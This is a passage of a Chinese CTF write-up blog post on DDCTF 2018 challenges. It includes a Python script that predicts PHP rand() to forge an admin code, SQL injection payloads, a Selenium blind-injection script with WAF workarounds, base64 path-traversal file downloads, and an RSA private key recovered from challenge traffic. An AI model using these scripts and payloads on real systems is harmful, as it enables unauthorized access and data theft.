![avatar](/assets/ddctf/20180421221550.png)\n\n然后，通过find_block_chain_tail方法，可以知道，该区块链是根据block['height']来判断最后一个区块链，如果构造一个更长的区块链，那么就可以控制整个区块链。\n\n```\ndef find_blockchain_tail():\n    return max(session['blocks'].values(), key=lambda block: block['height'])\n```\n\n ![avatar](/assets/ddctf/20180421222032.png)\n\n从上边的图可以看到，如果构造3个区块，（事实上，也有一定的概率，创建两个区块就行了），那么最后一个区块就是区块6，这时候，一切都回到起点，银行又有了1000000，然后就可以转账，转账之后，在创建一个区块，就可以拿到第一个钻石,如图所示。\n\n ![avatar](/assets/ddctf/20180421222814.png)\n\n接下来，来获取第二个钻石。这时候，只需要在区块7之后继续创建空的区块就行了。这样，shop又有了1000000，又可以买一个钻石，然后就可以拿到flag了。\n\n ![avatar](/assets/ddctf/20180421223014.png)\n\n需要注意的是，flask是客户端session，区块多了之后，cookie也会变得很大，由于浏览器cookie是有限制的，这样，当set-cookie的值过大的时候，就会出现set-cookie失败的情况，所以这道题最好使用脚本发包。\n\n# 我的博客\n## 审计代码\n根据提示，下载www.tar.gz,里边共有三个文件，index.php, login.php, register.php。\n### index.php\n\n```php\nif(isset($_GET['id'])){\n    $id = addslashes($_GET['id']);\n    if(isset($_GET['title'])){\n        $title = addslashes($_GET['title']);\n        $title = sprintf(\"AND title='%s'\", $title);\n    }else{\n        $title = '';\n    }\n    $sql = sprintf(\"SELECT * FROM article WHERE id='%s' $title\", $id);\n\n    foreach ($pdo->query($sql) as $row) {\n        echo \"<h1>\".$row['title'].\"</h1><br>\".$row['content'];\n        die();\n    }\n}\n```\n可以看到该地方使用了两次sprintf，可以立马想到[从WordPress SQLi谈PHP格式化字符串问题](https://paper.seebug.org/386/),问题就是，需要以admin的身份登录。\n\n### login.php\n\n```\nif($_SERVER['REQUEST_METHOD'] === \"POST\") {\n    if(!(isset($_POST['csrf']) and (string)$_POST['csrf'] === $_SESSION['csrf'])) {\n        die(\"CSRF token error!\");\n    }\n\n    $username = (isset($_POST['username']) === true && $_POST['username'] !== '') ? (string)$_POST['username'] : die('Missing username');\n    $password = (isset($_POST['password']) === true && $_POST['password'] !== '') ? (string)$_POST['password'] : die('Missing password');\n\n    if (strlen($username) > 32 || strlen($password) > 32) {\n        die('Invalid input');\n    }\n\n    $sth = $pdo->prepare('SELECT password FROM users WHERE username = :username');\n    $sth->execute([':username' => $username]);\n\n    if ($sth->fetch()[0] !== $password) {\n        die('wrong password');\n    }\n\n    $sth = $pdo->prepare('SELECT `identity` FROM users WHERE username = :username');\n    $sth->execute([':username' => $username]);\n\n    if ($sth->fetch()[0] === \"admin\") {\n        $_SESSION['is_admin'] = true;\n    } else {\n        $_SESSION['is_admin'] = false;\n    }\n\n    #echo $username;\n    header(\"Location: index.php\");\n}\n```\nlogin部分使用pdo进行查询，并且字符串之间的比较也是\"===\"，不可能存在任何漏洞。\n\n### register.php\n\n```\nif(!(isset($_POST['csrf']) and (string)$_POST['csrf'] === $_SESSION['csrf'])) {\n        die(\"CSRF token error!\");\n    }\n    \n    $admin = \"admin###\" . substr(str_shuffle('0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'), 0, 32);\n    $username = (isset($_POST['username']) === true && $_POST['username'] !== '') ? (string)$_POST['username'] : die('Missing username');\n    $password = (isset($_POST['password']) === true && $_POST['password'] !== '') ? (string)$_POST['password'] : die('Missing password');\n    $code = (isset($_POST['code']) === true) ? (string)$_POST['code'] : '';\n    if (strlen($username) > 32 || strlen($password) > 32) {\n        die('Invalid input');\n    }\n\n    $sth = $pdo->prepare('SELECT username FROM users WHERE username = :username');\n    $sth->execute([':username' => $username]);\n\n    if ($sth->fetch() !== false) {\n        die('username has been registered');\n    }\n\n    if($code === $admin) {\n        $identity = \"admin\";\n    } else {\n        $identity = \"guest\";\n    }\n\n    $sth = $pdo->prepare('INSERT INTO users (username, password, `identity`) VALUES (:username, :password, :identity)');\n    $sth->execute([':username' => $username, ':password' => $password, ':identity' => $identity]);\n\n    echo '<script>alert(\"register success\");location.href=\"./login.php\"</script>';\n} else {\n```\n\nregister部分，使用str_shuffle生成admin密码，同时给出rand()来作为csrf值。\n\n```\n<input type=\"hidden\" name=\"csrf\" id=\"csrf\" value=\"<?php $_SESSION['csrf'] = (string)rand();echo $_SESSION['csrf']; ?>\" required>\n<label for=\"inputUsername\" class=\"sr-only\">Username</label>\n```\n\n可以想到乌云的一篇文章，也是翻译自国外，原文可以自己找[Web应用隐形后门的设计与实现](https://wooyun.js.org/drops/Web%E5%BA%94%E7%94%A8%E9%9A%90%E5%BD%A2%E5%90%8E%E9%97%A8%E7%9A%84%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0.html)。这样的话，就可以明确思路，首先通过预测rand()值，来预测密码，在使用该密码注册一个账号，进入博客，然后通过sprintf格式化漏洞获取flag。\n\n## 解题\n现在关键就是预测rand()值，通过google，可以找到0ctf2016,有相似的题目，[http://www.vuln.cn/6004](http://www.vuln.cn/6004),文中提到，只要有大于等于32个连续的rand()随机数，就可以大概预测接下来rand()的值。\n\n```\n#!php\nstate[i] = state[i-3] + state[i-31]\nreturn state[i] % 2147483648\n```\n\n同时，需要知道一定要使用 requests.session来keep-alive，否则的话，获得的rand()值并不是连续的，也就不满足上面的公式了。\n\n此外，在获得超过32个rand()值之后，并预测到接下来的62个rand()之后，还需要重新实现str_shuffle函数。通过阅读php源码，可以找到str_shuffle函数的实现。\n\n```\nstatic void php_string_shuffle(char *str, long len TSRMLS_DC) /* {{{ */\n{\n\tlong n_elems, rnd_idx, n_left;\n\tchar temp;\n\t/* The implementation is stolen from array_data_shuffle       */\n\t/* Thus the characteristics of the randomization are the same */\n\tn_elems = len;\n\n\tif (n_elems <= 1) {\n\t\treturn;\n\t}\n\n\tn_left = n_elems;\n\n\twhile (--n_left) {\n\t\trnd_idx = php_rand(TSRMLS_C);\n\t\tRAND_RANGE(rnd_idx, 0, n_left, PHP_RAND_MAX);\n\t\tif (rnd_idx != n_left) {\n\t\t\ttemp = str[n_left];\n\t\t\tstr[n_left] = str[rnd_idx];\n\t\t\tstr[rnd_idx] = temp;\n\t\t}\n\t}\n}\n\n```\n其中RAND_RANGE函数的实现如下:\n\n```\n#define RAND_RANGE(__n, __min, __max, __tmax) \\\n(__n) = (__min) + (long) ((double) ( (double) (__max) - (__min) + 1.0) * ((__n) / ((__tmax) + 1.0)))\n\n```\n准备工作就绪，就可以编写代码了。\n代码如下:\n\n```\nimport requests\nfrom lxml import etree\n\nurl = \"http://116.85.39.110:5032/2ae51a1981cbbdef618d3c46af6199cb/register.php\"\n\ndata = {\n    'username': 'dida',\n    'password': 'dida',\n    'csrf': '2086003527',\n    'code': ''\n}\n\ndef get_csrf(html):\n    html = etree.HTML(html)\n    token = html.xpath('//*[@id=\"csrf\"]')[0].get('value')\n    return token\n\n\ndef rand_range(rand, n_left):\n     return int((n_left + 1.0) * (rand / (2147483648.0)))\n\n\ndef shuffle(calc_rand):\n    str = \"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\"\n    str_temp = list(str)\n    str_len = len(str_temp)\n    n_left = str_len - 1\n    temp = \"\"\n    while n_left:\n        randdata = calc_rand[61 - n_left]\n        index = rand_range(randdata, n_left)\n        if index != n_left:\n            temp = str_temp[n_left]\n            str_temp[n_left] = str_temp[index]\n            str_temp[index] = temp\n        n_left = n_left - 1\n\n    return \"\".join(str_temp)\n\nwhile 1:\n    s = requests.session()\n    l = []\n    for i in range(33):\n        res = s.get(url)\n        token = get_csrf(res.content)\n        l.append(token)\n\n    calc_rand = []\n    temp_calc_rand = []\n    for i in range(33, 95):\n        value = (int(l[i - 31]) + int(l[i-3])) % 2147483648\n        l.append(value)\n        temp_calc_rand.append(value)\n\n    str = \"admin###\" + shuffle(temp_calc_rand)[0:32]\n    data['code'] = str\n    data['csrf'] = l[32]\n\n    res = s.post(url = url, data = data)\n    print(res.content)\n    break\n```\n运行上边的代码，就可以注册一个账号，至于该账号是不是admin,多试几次总会成功。\n\n登陆之后，就可以使用sprintf字符串格式化漏洞来进行sql注入。这个就不在赘述了。\n基本的payload如下:\n>http://116.85.39.110:5032/2ae51a1981cbbdef618d3c46af6199cb/index.php?id=%1$&title=%1$' or 2=1 union select 1,2,3%23\n\n最后得到flag: ```DDCTF{9b7ccc1e96387b5ce079adab2fb08022}```\n\n","source":"_posts/ddctf.md","raw":"---\ntitle: ddctf2018\ndate: 2018-04-20 14:45:40\ntags: ctf\n---\n# 签到题目:\n复制，粘贴\n\n# (╯°□°）╯︵ ┻━┻\n题目给了一个字符串\n```\nd4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb9e1b2e2e5e2b5b4e4b8b7e6e1e1b6b9e4b5e3b8b1b1e3e5b5b6b4b1b0e4e6b2fd\n```\n\n首先，应该想到两两一组，一组代表一个字符，考虑到DDCTF，\"DD\"两个字符，在字符串中找到两组相邻的字符串，找到了\"c4c4\"和\"e1e1\"：\n\nd4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0<b>c4c4</b>c3d4c6fbb9e1b2e2e5e2b5b4e4b8b  7e6<b>e1e1</b>b6b9e4b5e3b8b1b1e3e5b5b6b4b1b0e4e6b2fd\n\n进一步分析可知，<b>c4</b>和<b>c3</b>刚好相差1，而<b>D</b>和<b>C</b>的ascii值也相差1，<b>c4c4</b>应该就表示\"DD\", 然后以此类推：\n\n![avatar](/assets/ddctf/20180420150038.png)\n\n# 第四扩展FS\n1. 下载下来是一张图片\n\n首先: `binwalk windows.jpg`\n\n```\nsecurity:/mnt/c/Users/HT/Desktop/ddctf$ binwalk windows.jpg\n\nDECIMAL         HEX             DESCRIPTION\n-------------------------------------------------------------------------------------------------------\n30              0x1E            TIFF image data, big-endian\n2871992         0x2BD2B8        LZMA compressed data, properties: 0x01, dictionary size: 2097152 bytes, uncompressed size: 134217728 bytes\n7236510         0x6E6B9E        Zip archive data, at least v2.0 to extract, compressed size: 20430, uncompressed size: 33350, name: \"file.txt\"\n7257054         0x6EBBDE        End of Zip archive\n\nProgress: 81.81% (10890274 / 13310878)\n```\n可以看到图片里边有个压缩包。\n这时候，可以使用`dd`或者`foremost`命令，来分离压缩包。\n\n> dd if=windows.jpg of=temp.zip skip=7236510 count=20544 bs=1  \n> foremost windows.jpg\n\n得到一个压缩包，然后，查看图片属性，会在详细信息->备注里看到一个字符串\"Pactera\"，估计就是密码。\n\n2. 然后打开file.txt\n\n![avatar](/assets/ddctf/20180420151247.png)  \n可以看到有很多乱序字符，结合题目的提示，<b>日常违规审计中频次有时候非常重要</b>,可以统计一下每个字符串的个数，并排序。\n\n```\ngrep -o . file.txt | sort |uniq -c | sort -rn\n```\n\n![avatar](/assets/ddctf/20180420151941.png)\n\n然后从新组合一下，就得到flag了。\n\n```\nDDCTF{ZuozHengqU3dEshi}\n```\n<!--more-->\n\n# 流量分析\n这道题，花了我很长时间，直到ddctf快结束，才做出来，可以说完全被Fl-g.zip和sqlmap.zip绕进去了，气的我都想打我自己。  \n过程如下:\n首先大体上浏览整个数据包，会发现，大体上就是3个部分:  \n\n+  ftp 发送了两个zip,Fl-g.zip和sqlmap.zip,传了一大堆数据  \n+  邮件相关的数据包\n+  https相关的包，由于只有几个，竟然被我选择性忽略了。\n\n## ftp之Fl-g.zxip\n> tcp.stream eq 2004   \n\n右键follow tcp流，保存数据，发现只有119kb，解压也提示包损坏，要密码，最终也没啥结果。\n\n然后，感觉应该是follow tcp流，没有得到所有的数据，于是，使用:\n> tcp.stream eq 2004 && ftp-data\n\n得到Fl-g.zip相关的数据包,另存为flag.pcap，然后编写代码，一个一个的拼接数据。\n\n```\nfrom scapy.all import * \npcaps = rdpcap(\"flag.pcap\")\n\nfp = open(\"flag.zip\", \"wb\")\nlength = 0\nfor pcap in pcaps:\n    value = pcap['Raw'].original\n    length += len(value)\n    fp.write(value)\nprint(length)\nfp.close()\n```\n得到13M大小的flag.zip,通过一番操作，尝试了密码爆破，伪加密，压缩包修复，来来回回折腾了几遍，最终，使用7-zip，密码:zhangsan，竟然解压得到了一个类似于mp4格式的文件，不知道这玩意和qr-code.jpg有什么关系，还没办法播放。主要原因，还是Fl-g.zip缺失了大量的数据，在明知缺失大量数据的情况下，感觉应该立即放弃，不过这压缩包名字实在太忽悠，折腾了3,4天我才放弃，浪费我大量时间。\n\n## ftp之sqlmap.zip\n> tcp.stream eq 2005\n\n既然给了这个压缩包，感觉应该会有点用（实际上:一点用没有）,首先，follow tcp流，只有163kb，于是和Fl-g.zip一样,过滤:\n> tcp.stream eq 2004 && ftp-data\n\n得到sqlmap.zip相关的数据包,另存为sqlmap.pcap，然后编写代码，一个一个的拼接数据。\n\n\n```\nfrom scapy.all import * \npcaps = rdpcap(\"sqlmap.pcap\")\n\nfp = open(\"sqlmap.zip\", \"wb\")\nlength = 0\nfor pcap in pcaps:\n    value = pcap['Raw'].original\n    length += len(value)\n    fp.write(value)\nprint(length)\nfp.close()\n```\n\n得到了一个sqlmap.zip，第一次打开，用winrar，点击工具->修复压缩文件，修复一下。然后，爆破，伪加密，又搞了一遍，我都不知道我哪来的耐心。最后，想到已知明文攻击。\n\n已知明文攻击: 已知明文攻击要求加密的压缩包和非加密的压缩包里有相同的文件，并且文件的crc32值要相同，然后就可以使用archpr这个软件进行已知明文攻击。\n\n然后，去github.com下载最新版本的sqlmap,发现文件的crc32值并不相同，需要下载sqlmap1.1.10.zip才行。最后，解压sqlmap.zip得到的文件和sql1.1.10.zip里的文件一模一样，没有一点有用的东西。\n\n## 邮件部分\n通过follow tcp流，当tcp.stream eq 2016的时候，会看到有一个image001图片:\n\n```\nContent-type: image/png; name=\"image001.png\";\n x-mac-creator=\"4F50494D\";\n x-mac-type=\"504E4766\"\nContent-ID: <image001.png@01D38B05.8079CE40>\nContent-disposition: inline;\n\tfilename=\"image001.png\"\nContent-transfer-encoding: base64\n```\n\n下边跟着一大堆base64字符串，直接复制保存到一个文件1.txt里边。\n\n```\nimport base64\n\nfp = open(\"1.txt\", \"r\")\nfp1 = open(\"file.png\", \"wb\")\n\nfp1.write(base64.b64decode(fp.read()))\n```\n\n然后，就可以得到一个file.png。\n\n![avatar](/assets/ddctf/20180425151942.png)\n\n然后，就是将图片中的字符串提取出来。\n\n```\nMIICXAIBAAKBgQDCm6vZmclJrVH1AAyGuCuSSZ8O+mIQiOUQCvN0HYbj8153JfSQ\nLsJIhbRYS7+zZ1oXvPemWQDv/u/tzegt58q4ciNmcVnq1uKiygc6QOtvT7oiSTyO\nvMX/q5iE2iClYUIHZEKX3BjjNDxrYvLQzPyGD1EY2DZIO6T45FNKYC2VDwIDAQAB\nAoGAbtWUKUkx37lLfRq7B5sqjZVKdpBZe4tL0jg6cX5Djd3Uhk1inR9UXVNw4/y4\nQGfzYqOn8+Cq7QSoBysHOeXSiPztW2cL09ktPgSlfTQyN6ELNGuiUOYnaTWYZpp/\nQbRcZ/eHBulVQLlk5M6RVs9BLI9X08RAl7EcwumiRfWas6kCQQDvqC0dxl2wIjwN\nczILcoWLig2c2u71Nev9DrWjWHU8eHDuzCJWvOUAHIrkexddWEK2VHd+F13GBCOQ\nZCM4prBjAkEAz+ENahsEjBE4+7H1HdIaw0+goe/45d6A2ewO/lYH6dDZTAzTW9z9\nkzV8uz+Mmo5163/JtvwYQcKF39DJGGtqZQJBAKa18XR16fQ9TFL64EQwTQ+tYBzN\n+04eTWQCmH3haeQ/0Cd9XyHBUveJ42Be8/jeDcIx7dGLxZKajHbEAfBFnAsCQGq1\nAnbJ4Z6opJCGu+UP2c8SC8m0bhZJDelPRC8IKE28eB6SotgP61ZqaVmQ+HLJ1/wH\n/5pfc3AmEyRdfyx6zWUCQCAH4SLJv/kprRz1a1gx8FR5tj4NeHEFFNEgq1gmiwmH\n2STT5qZWzQFz8NRe+/otNOHBR2Xk4e8IS+ehIJ3TvyE=\n```\n\n再结合题目的提示，应该就是RSA私钥。我找到的东西大概就这么多。\n\n一开始的思路，就是解压Fl-g.zip，得到qr-code.jpg,最后，估计用这个私钥去解密什么东西得到flag。由于这错误的思路，所以做了3,4天没做出来。\n\n## 得到flag\n今天是ddctf最后一天，\"喝杯java\"，感觉来不及做了，就又开始看这道题，百度了一下，wireshark如何使用rsa私钥解密https流量。\n\nrsa密钥也就是，保存一下就行了:\n\n```\n-----BEGIN RSA PRIVATE KEY-----\nMIICXAIBAAKBgQDCm6vZmclJrVH1AAyGuCuSSZ8O+mIQiOUQCvN0HYbj8153JfSQ\nLsJIhbRYS7+zZ1oXvPemWQDv/u/tzegt58q4ciNmcVnq1uKiygc6QOtvT7oiSTyO\nvMX/q5iE2iClYUIHZEKX3BjjNDxrYvLQzPyGD1EY2DZIO6T45FNKYC2VDwIDAQAB\nAoGAbtWUKUkx37lLfRq7B5sqjZVKdpBZe4tL0jg6cX5Djd3Uhk1inR9UXVNw4/y4\nQGfzYqOn8+Cq7QSoBysHOeXSiPztW2cL09ktPgSlfTQyN6ELNGuiUOYnaTWYZpp/\nQbRcZ/eHBulVQLlk5M6RVs9BLI9X08RAl7EcwumiRfWas6kCQQDvqC0dxl2wIjwN\nczILcoWLig2c2u71Nev9DrWjWHU8eHDuzCJWvOUAHIrkexddWEK2VHd+F13GBCOQ\nZCM4prBjAkEAz+ENahsEjBE4+7H1HdIaw0+goe/45d6A2ewO/lYH6dDZTAzTW9z9\nkzV8uz+Mmo5163/JtvwYQcKF39DJGGtqZQJBAKa18XR16fQ9TFL64EQwTQ+tYBzN\n+04eTWQCmH3haeQ/0Cd9XyHBUveJ42Be8/jeDcIx7dGLxZKajHbEAfBFnAsCQGq1\nAnbJ4Z6opJCGu+UP2c8SC8m0bhZJDelPRC8IKE28eB6SotgP61ZqaVmQ+HLJ1/wH\n/5pfc3AmEyRdfyx6zWUCQCAH4SLJv/kprRz1a1gx8FR5tj4NeHEFFNEgq1gmiwmH\n2STT5qZWzQFz8NRe+/otNOHBR2Xk4e8IS+ehIJ3TvyE=\n-----END RSA PRIVATE KEY-----\n```\n\n\n![avatar](/assets/ddctf/20180420184445.png)\n\n然后，查看http包，flag就出来了。\n\n![avatar](/assets/ddctf/20180420183706.png)\n\n# 数据库的秘密\n## X-forwarded-for\n首先打开网页，可以看到\"非法链接，只允许来自 123.232.23.245 的访问\",很容易就想到修改X-forwarded-for, Chrome下我使用[Modheader](https://chrome.google.com/webstore/search/modheader?hl=zh-CN)插件,然后修改一下X-forwarded-for就行了\n## 寻找注入点\n既然是数据库的秘密，加上又有查询功能，应该就是sql注入了。在查看源码之后，会发现除了id,title,date三个字段之外还有一个隐藏字段author，然后就是一个一个的测试，不出意外应该是author可以注入，为了保险还是一个一个的测试一下。\n\n* id 无论输入什么，都会被转化为数字或者为空，应该是用了intval()，不存在注入点。\n* title和date均过滤了单引号，双引号，右斜杠，宽字节也不好使，估计也不好注入。\n* author\n  * \"admin\", 会得到author 为 \"admin\" 的两条记录\n  * \"admin'\", 一条记录都没有\n  * \"admin'#\", 同样会得到author 为 \"admin\" 的两条记录，那注入点应该就是这里了。\n  * \"admin' and 1=1#\", 发现会有网站防火墙拦截，应该是\"and\"被拦截，可以使用\"&&\"来替换\"and\",然后，同样会查询出两条记录。\n\n## 注入 \n找到注入点之后，就好办了。\n\n* \"admin' order by 6#\", 失败，\"admin' order by 5#\"，成功查询，那就是5列了。 \n* \"admin' union select 1,2,3,4,5#\", 被防火墙拦截，然后就是各种测试\"union select\",没能成功绕过(比赛结束之后，有师傅说可以绕过，[链接](https://github.com/Bypass007/vuln/blob/master/OpenResty/OpenResty%20uri%E5%8F%82%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E.md)，由兴趣的小伙伴可以尝试一下)。那就尝试bool注入了。\n* \"admin' && 1=(substr((select group_concat(schema_name) from information_schema.schemata),1,1)<'z')#\",成功拿到数据，接下来就是写脚本拿flag了。\n  脚本如下:\n\n```\nimport time\nfrom selenium import webdriver\nimport string\n\nstrings = string.ascii_letters + string.punctuation + string.digits\nstring_value = \",0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz{}\"\nurl=\"http://116.85.43.88:8080/EHZTYREPPGMCQLNB/dfe3ia/index.php\"\npath=\"D:\\\\python\\\\chromedriver.exe\"\ndriver = webdriver.Chrome(executable_path=path)\npayload = \"admin' && 1=(substr((select group_concat(schema_name) from information_schema.schemata),%d,1)='%s')#\"\npayload_table = \"admin' && 1=(substr((select group_concat(table_name) from information_schema.tables where table_schema='ddctf'),%d,1)='%s')#\"\npayload_column = \"admin' && 1=(substr((select group_concat(column_name) from information_schema.columns where table_name='ctf_key7'),%d,1)='%s')#\"\npayload_value = \"admin' && 1=(ord(substr((select group_concat(secvalue) from ddctf.ctf_key7),%d,1))=ord('%s'))#\"\n\ndef inject():\n    data = \"\"\n\n    driver.get(url)\n    input(\"jixu:\")\n    judge = True\n    index = 1\n    while judge:\n        judge_temp = False\n        for i in string_value:\n            payload_temp = payload_value % (index, i)\n            print(payload_temp)\n            driver.get(url)\n            driver.execute_script('document.getElementById(\"author\").type=\"text\"')\n            driver.find_element_by_id(\"author\").send_keys(payload_temp)\n            driver.find_element_by_id(\"button\").click()\n            if \"admin\" in driver.page_source:\n                data += i\n                index += 1\n                judge_temp = True\n                print(data)\n                break\n            time.sleep(1)\n        if judge_temp is not True:\n            driver.close()\n\t\t\tjudge = False\n\ninject(payload_value)\n# table_schema:  ddctf\n# tables: ctf_key7, message\n# columns: ctf_key7下: secvalue，flag就保存在sevalue里边\n```\n\n## 注意点\n* 每次请求时，js都会计算一个sig值和time值，计算方法在main.js中\n\n   ```js\n   eval(function(p,a,c,k,e,d){e=function(c){return(ca?\"\":e(parseInt(c/a)))+((c=c%a)35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('e f(0,4){5 7='';l(i m 0){n(i!='c'){a='';a=i+'='+0[i];7+=a}}o k(7+4)};5 0={8:'',9:'',b:'',6:'',d:h(j v().u()/w)};e x(){0['8']=1.2('8').3;0['9']=1.2('9').3;0['b']=1.2('b').3;0['6']=1.2('6').3;5 c=f(0,4);1.2('g').q=\"p.s?r=\"+c+\"&d=\"+0.d;1.2('g').t()}',34,34,'obj|document|getElementById|value|key|var|date|str0|id|title|str1|author|sign|time|function|signGenerate|queryForm|parseInt||new|hex_math_enc|for|in|if|return|index|action|sig|php|submit|getTime|Date|1000|submitt'.split('|'),0,{})) \n   ```\n\n   看上去挺复杂，所以我就用selenium，这样就不用操心sig和time值了。\n\n* 由于需要修改X-forwarded-for值，可以使用代理，我这里采用了更笨的方法，在代码里可以看到:\n\n   ```\n   driver.get(url)\n   input(\"jixu:\")\n   ```\n\n   首先先发起一次请求，启动webdriver，然后用input()阻塞，这时候，就可以在启动之后的webdriver中安装[Modheader](https://chrome.google.com/webstore/search/modheader?hl=zh-CN)插件，安装完毕，修改好X-forwarded-for之后，就可以在控制台随便输入一个数据，然后，脚本就可以欢快的执行了。\n\n# 专属链接\n## 任意文件下载\n首先F12抓包，会看到一个有意思的请求，http://116.85.48.102:5050/image/banner/ZmF2aWNvbi5pY28=,\"ZmF2aWNvbi5pY28=\",base64_encode之后就是\"favicon.ico\",图片的内容如下:\"you can only download .class .xml .ico .ks files\",表明应该是一个下载链接，然后就可以按照war包的格式，下载指定后缀的任意文件了。\n\n![avatar](/assets/ddctf/20180421191033.png)\n\n其中需要注意的有三个文件，\n\n* _.._WEB-INF_classes_com_didichuxing_ctf_controller_user_FlagController.class,该文件的地址通过构造\"116.85.48.102:5050/flag/test/flag/DDCTF{BASD}\"或类似的链接使得网站报错即可得到。\n\n ![avatar](/assets/ddctf/201804211191034.png)\n\n* _.._WEB-INF_classes_com_didichuxing_ctf_controller_user_StaticController.class,该文件的地址通过构造\"116.85.48.102:5050/image/banner/[随便一个错误的地址]\"或类似的链接使得网站报错即可得到。\n\n ![avatar](/assets/ddctf/20180421191037.png)\n\n* _.._WEB-INF_classes_emails.txt_a___,这个文件按理来说是无法下载的，不过我做题的时候，还是可以下载的，可以通过\"116.85.48.102:5050/base64_encode('../../WEB-INF/classes/email.txt/a/../')\",(注意，base64_encode('../../WEB-INF/classes/email.txt/a/../')是个base64之后的字符串，我这里为了方便大家查看这么写的),就可以绕过了,是个非预期，过了几天，bug修补之后，就没办法下载了，里面的邮箱或者首页的邮箱其实都可以用，所以这个文件下载下不下都无所谓，可惜了，当时应该可以下载数据库的配置文件的，我因为拿到flag就忘记的这一茬，不然，说不定还能改别人的flag，当然我是不可能这么做滴~。\n\n## 审计代码\n\n下载下来的class文件，通过Intellij idea打开，就可以直接得到反编译之后的代码了。\n其中最重要的两个文件是FlagController.class和InitListener.class。\n\n* FlagController.class\n\n```\npublic String getFlag(@PathVariable(\"email\") String email, ModelMap model) {\n        Flag flag = this.flagService.getFlagByEmail(email);\n        return \"Encrypted flag : \" + flag.getFlag();\n    }\n```\n在该文件中，可以得到一个获取加密后的flag的路由，需要一个邮箱，当然该邮箱也是加密之后的邮箱，如何加密邮箱，可以在InitListener.class中看到。\n\n* InitListener.class\n\n```\npublic void onApplicationEvent(ApplicationEvent event) {\n        if(event.getSource() instanceof ApplicationContext) {\n            WebApplicationContext ctx = (WebApplicationContext)event.getSource();\n            if(ctx.getParent() == null) {\n                String regenflag = this.properties.getProperty(\"regenflag\");\n                if(regenflag != null && \"false\".equals(regenflag)) {\n                    System.out.println(\"skip gen flag\");\n                } else {\n                    try {\n                        this.flagService.deleteAll();\n                        int id = 1;\n                        String path = ctx.getServletContext().getRealPath(\"/WEB-INF/classes/emails.txt\");\n                        String ksPath = ctx.getServletContext().getRealPath(\"/WEB-INF/classes/sdl.ks\");\n                        System.out.println(path);\n                        String emailsString = FileUtils.readFileToString(new File(path), \"utf-8\");\n                        String[] emails = emailsString.trim().split(\"\\n\");\n                        KeyStore keyStore = KeyStore.getInstance(KeyStore.getDefaultType());\n                        FileInputStream inputStream = new FileInputStream(ksPath);\n                        keyStore.load(inputStream, this.p.toCharArray());\n                        Key key = keyStore.getKey(\"www.didichuxing.com\", this.p.toCharArray());\n                        Cipher cipher = Cipher.getInstance(key.getAlgorithm());\n                        cipher.init(1, key);\n                        SecretKeySpec signingKey = new SecretKeySpec(\"sdl welcome you !\".getBytes(), \"HmacSHA256\");\n                        Mac mac = Mac.getInstance(\"HmacSHA256\");\n                        mac.init(signingKey);\n                        SecureRandom sr = new SecureRandom();\n                        String[] var16 = emails;\n                        int var17 = emails.length;\n\n                        for(int var18 = 0; var18 < var17; ++var18) {\n                            String email = var16[var18];\n                            String flag = \"DDCTF{\" + Math.abs(sr.nextLong()) + \"}\";\n                            String uuid = UUID.randomUUID().toString().replace(\"-\", \"s\");\n                            byte[] data = cipher.doFinal(flag.getBytes());\n                            byte[] e = mac.doFinal(String.valueOf(email.trim()).getBytes());\n                            Flag flago = new Flag();\n                            flago.setId(Integer.valueOf(id));\n                            flago.setFlag(byte2hex(data));\n                            flago.setEmail(byte2hex(e));\n                            flago.setOriginFlag(flag);\n                            flago.setUuid(uuid);\n                            flago.setOriginEmail(email);\n                            this.flagService.save(flago);\n                            System.out.println(email + \"同学的入口链接为：http://116.85.48.102:5050/welcom/\" + uuid);\n                            ++id;\n                            System.out.println(flago);\n                        }\n                    } catch (KeyStoreException var25) {\n                        var25.printStackTrace();\n                    } catch (IOException var26) {\n                        var26.printStackTrace();\n                    } catch (NoSuchAlgorithmException var27) {\n                        var27.printStackTrace();\n                    } catch (CertificateException var28) {\n                        var28.printStackTrace();\n                    } catch (UnrecoverableKeyException var29) {\n                        var29.printStackTrace();\n                    } catch (NoSuchPaddingException var30) {\n                        var30.printStackTrace();\n                    } catch (InvalidKeyException var31) {\n                        var31.printStackTrace();\n                    } catch (IllegalBlockSizeException var32) {\n                        var32.printStackTrace();\n                    } catch (BadPaddingException var33) {\n                        var33.printStackTrace();\n                    }\n\n                }\n            }\n        }\n    }\n```\n该文件中onApplicationEvent方法意思是，在应用启动之后，首先判断是否需要生成flag，如果需要生成flag，然后读取email.txt里边的邮箱一一加密，同时生成flag，并保存到数据库中。只要可以得到加密后的email.txt就可以获得加密后的flag，并通过相应的sdl.ks获取公钥，最终解密加密后的flag即可得到flag了。\n\n## 获取flag\n* 生成加密的email，随便在email.txt中获取一条email，或者首页的邮箱。\n\n```\npublic class cipher {\n    public static  void main(String[] args) throws Exception {\n        gencipher();\n//        String email = \"email\";\n//        SecretKeySpec signingKey = new SecretKeySpec(\"sdl welcome you !\".getBytes(), \"HmacSHA256\");\n//        Mac mac = Mac.getInstance(\"HmacSHA256\");\n//        mac.init(signingKey);\n//        byte[] e = mac.doFinal(String.valueOf(email.trim()).getBytes());\n//        System.out.println(byte2hex(e));\n    }\n\n    public static void gencipher() throws Exception {\n        String p = \"sdl welcome you !\".substring(0, \"sdl welcome you !\".length() - 1).trim().replace(\" \", \"\");\n        String ksPath = \"D:\\\\java\\\\ddctf\\\\src\\\\main\\\\java\\\\sdl.ks\";\n        KeyStore keyStore = KeyStore.getInstance(KeyStore.getDefaultType());\n        FileInputStream inputStream = new FileInputStream(ksPath);\n        keyStore.load(inputStream, p.toCharArray());\n//        Key key = keyStore.getKey(\"www.didichuxing.com\", p.toCharArray());\n        Key key = keyStore.getCertificate(\"www.didichuxing.com\").getPublicKey();\n        Cipher cipher = 